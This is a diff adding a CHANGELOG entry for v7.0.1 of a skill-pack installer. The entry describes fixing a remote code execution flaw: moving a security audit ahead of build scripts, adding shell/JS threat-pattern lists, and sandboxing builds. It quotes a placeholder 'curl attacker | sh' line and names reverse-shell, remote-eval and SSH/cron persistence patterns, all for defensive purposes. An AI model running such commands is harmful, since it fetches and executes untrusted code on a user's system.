@@ -9,6 +9,62 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### v7.0.1 — Pack Install Security Ordering Fix
+
+Closes the P0 RCE in `PackInstaller`: prior to this release, a malicious
+pack's `BUILD.sh` / `setup.sh` / `.vibesop-build` / `package.json.scripts`
+ran with local user privileges BEFORE `SkillSecurityAuditor` ever saw the
+file. A pack could ship `BUILD.sh` containing `curl attacker | sh` and get
+RCE during install while the audit step (which only scans `SKILL.md`)
+reported "PASS".
+
+#### Pre-Install Audit Gate (P0)
+
+- feat(security): `SkillSecurityAuditor.audit_pack_files(pack_dir,
+  pack_name)` scans ALL audited file types (.sh / .bash / .js / .mjs / .cjs
+  / .py / .md / .yaml / .yml / .json) before any build script runs.
+- feat(security): `SHELL_THREAT_PATTERNS` and `JS_THREAT_PATTERNS` cover
+  RCE primitives that prompt-injection patterns miss (curl|sh, reverse
+  shell, eval(remote), child_process, SSH authorized_keys, cron/launch
+  agent persistence, process substitution with HTTP clients).
+- feat(security): `PackAuditResult` dataclass with `has_critical` /
+  `has_high` / `summary` and `to_dict()` serialization. HIGH downgrades
+  to MEDIUM for trusted packs (consistent with `audit_skill_file`); CRITICAL
+  never downgraded.
+
+#### Install Order Inversion
+
+- fix(installer): `PackInstaller.install_pack` now runs
+  `audit_pack_files` → reject on CRITICAL or untrusted+HIGH → sandboxed
+  build → post-install SKILL.md audit. The `_run_post_install` call now
+  happens AFTER the pre-audit gate, not before.
+- feat(installer): `PackInstaller` gains `sandbox_builds=True` and
+  `allow_unsafe_build=False` constructor flags. Default behavior is to
+  prefer an ephemeral `--network=none --memory=512m --cpus=0.5` container
+  for build execution; falls back to local only with explicit opt-in.
+- feat(installer): `_detect_container_runtime` reuses the prompt-chain
+  validator's detection order (orbstack → docker → lima).
+- feat(installer): `_run_build_in_container` mounts the pack read-only
+  and blocks egress so even a CRITICAL-level `curl|sh` cannot exfiltrate.
+
+#### Tests
+
+- test(installer): `tests/installer/test_pack_install_order.py` — 13 tests
+  pinning the new ordering (pre-audit gate, sandbox vs local fallback,
+  PackAuditResult dataclass, audit_pack_files end-to-end).
+- test(installer): existing `test_pack_installer.py` updated to mock
+  `audit_pack_files` with a clean result so the new flow is exercised.
+
+#### Verification
+
+- 13 new tests pass; 228 tests in tests/installer + tests/security pass.
+- basedpyright: 0 new errors (pre-existing `rmtree(onerror=)` deprecation
+  on line 31 untouched — separate cleanup task).
+- 9 unrelated pre-existing failures in tests/{integration,integrations,
+  core/skills} confirmed via `git stash` to exist on main before this change.
+
+---
+
 ### v7.0 — Hook Reliability + Multi-Agent Squad Auto-Trigger + Skill Validator
 
 This release closes the gap between the CLI path (`vibe route`) and the
